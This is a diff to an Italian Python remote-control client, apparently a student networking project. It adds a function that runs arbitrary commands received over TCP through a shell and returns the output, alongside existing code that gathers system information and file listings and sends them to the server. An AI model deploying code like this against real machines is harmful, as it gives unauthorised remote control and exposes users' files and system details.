@@ -1,5 +1,7 @@
+import glob
 import os
 import pickle
+import subprocess
 import sys
 from socket import *
 import platform
@@ -8,9 +10,10 @@ import time
 import signal
 from os import system
 import traceback
+from threading import Timer
 from traceback import print_exc
 
-IP = "192.168.5.95"
+IP = "localhost"
 PORT = 8082  # Porta di Ascolto del TCP
 ADDR = (IP, PORT)
 SIZE = 4096
@@ -95,30 +98,76 @@ def sendInfo(client):
 
 
 def filespath(tipologia, client):
+    allType = tipologia
+    listaType = tipologia.split()
+    result = [""]
 
-    result = ["Lista dei risultati per estensione " + tipologia + "\n\n"]
+    for n in range(len(listaType)):
+        tipologia = listaType[n]
+        result.append("\n\nLista dei risultati per estensione " + tipologia + "\n\n")
+        if tipologia == "*":
+            if platform.system() == "Darwin":
+                for cartella, sottocartelle, file in os.walk(r"/mnt/"):
+                    for item in file:
+                        result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")
 
-    if platform.system() == "Darwin":
-        print("sistema riconosciuto")
-        print("tipologia: "+tipologia)
-        for cartella, sottocartelle, file in os.walk(r"/Users/erasmo/Desktop"):
-            for item in file:
-                if item.endswith(tipologia):
-                    print("ho trovato il file: "+item)
-                    result.append('"' + item + '"' + " nel percorso: " + os.path.dirname(item) + "\n")
+                    for cart in sottocartelle:
+                        for item in file:
+                            result.append('"' + item + '"' + " nel percorso: " + cartella + "/" + cart + "\n")
 
-    elif platform.system() == "Windows":
-        for cartella, sottocartelle, file in os.walk(r"C:\Users\*\Desktop"):
-            for item in file:
-                if item.endswith(tipologia):
-                    result.append('"' + item + '"' + " nel percorso: " + os.path.dirname(os.path.realpath(item)) + "\n")
+            elif platform.system() == "Windows":
+                for cartella, sottocartelle, file in os.walk(r"C:\Users\biagi\Desktop\Progetto Reti"):
+                    for item in file:
+                        result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")
 
-    elif platform.system() == "Linux":
-        for cartella, sottocartelle, file in os.walk(r"/mnt/"):
-            for item in file:
-                if item.endswith(tipologia):
-                    result.append('"' + item + '"' + " nel percorso: " + os.path.dirname(os.path.realpath(item)) + "\n")
+                    for cart in sottocartelle:
+                        for item in file:
+                            result.append('"' + item + '"' + " nel percorso: " + cartella + "\\" + cart + "\n")
 
+            elif platform.system() == "Linux":
+                for cartella, sottocartelle, file in os.walk(r"/mnt/"):
+                    for item in file:
+                        result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")
+
+                    for cart in sottocartelle:
+                        for item in file:
+                            result.append('"' + item + '"' + " nel percorso: " + cartella + "/" + cart + "\n")
+        else:
+
+            if platform.system() == "Darwin":
+                for cartella, sottocartelle, file in os.walk(r"/mnt/"):
+                    for item in file:
+                        if item.endswith(tipologia):
+                            result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")
+
+                    for cart in sottocartelle:
+                        for item in file:
+                            if item.endswith(tipologia):
+                                result.append('"' + item + '"' + " nel percorso: " + cartella + "/" + cart + "\n")
+
+            elif platform.system() == "Windows":
+                for cartella, sottocartelle, file in os.walk(r"C:\Users\biagi\Desktop\Università"):
+                    for item in file:
+                        if item.endswith(tipologia):
+                            result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")
+
+                    for cart in sottocartelle:
+                        for item in file:
+                            if item.endswith(tipologia):
+                                result.append('"' + item + '"' + " nel percorso: " + cartella + "\\" + cart + "\n")
+
+            elif platform.system() == "Linux":
+                for cartella, sottocartelle, file in os.walk(r"/mnt/"):
+                    for item in file:
+                        if item.endswith(tipologia):
+                            result.append('"' + item + '"' + " nel percorso: " + cartella + "\n")
+
+                    for cart in sottocartelle:
+                        for item in file:
+                            if item.endswith(tipologia):
+                                result.append('"' + item + '"' + " nel percorso: " + cartella + "/" + cart + "\n")
+
+    result.append("\n### TROVATI TUTTI I FILE CON ESTENSIONE " + tipologia + "###\n\n")
     result = ''.join(result)
 
     try:
@@ -130,6 +179,8 @@ def filespath(tipologia, client):
     except:
         traceback.print_exc()
         client.send(("Download fallito").encode(FORMAT))
+
+
 #cerco tutti i file con estensione indicata in un certo path
 def find(comando, client):
     try:
@@ -165,6 +216,43 @@ def find(comando, client):
             client.send(("Connessione interrotta").encode(FORMAT))
         else:
             client.send(("Si è verificato un errore, verifica il comando").encode(FORMAT))
+
+
+# [Funzione] che esegue i commandi sulla macchina client e li manda al server
+def eseguiCommando(client, command, sistemaOperativo):
+    try:
+        if sistemaOperativo == "Windows":
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
+                                       shell=True)
+            timer = Timer(20, process.terminate)
+            try:
+                timer.start()
+                stdout, stderr = process.communicate()
+                output = stdout or stderr
+            finally:
+                timer.cancel()
+            final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
+            client.send(("Dati in arrivo...").encode(FORMAT))
+
+            filesize = sys.getsizeof(final_output)
+            client.send((str(filesize)).encode(FORMAT))
+            time.sleep(3)
+            client.send((final_output).encode(FORMAT))
+
+        else:
+            print("Eseguo il comando")
+            output = subprocess.getoutput(command)
+            output.encode()
+            client.send(output.encode())
+
+    except Exception as e:
+        if e.__class__.__name__ == "ConnectionResetError":
+            client.send(("Connessione interrotta").encode(FORMAT))
+        else:
+            client.send(("Si è verificato un errore, verifica il comando").encode(FORMAT))
+
+
+# funzione di remote control
 def openRemoteControl(client):
     comando = "null"
     while comando != "exit":
@@ -219,8 +307,12 @@ def openRemoteControl(client):
                 infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd() + "\n"
                 client.send(((infos)).encode(FORMAT))
                 time.sleep(1.5)
-            # else comandi già interpretati dal sistema (controllo diretto sul terminale)
+            #Tutti gli altri commandi
+            else:
+                eseguiCommando(client,comando,platform.system())
+
         except Exception as e:
+            traceback.print_exc()
             client.send(("[ERROR] Command " + comando + " not found ...\n").encode(FORMAT))
             comando = "null"
             if e.__class__.__name__== "ConnectionResetError":
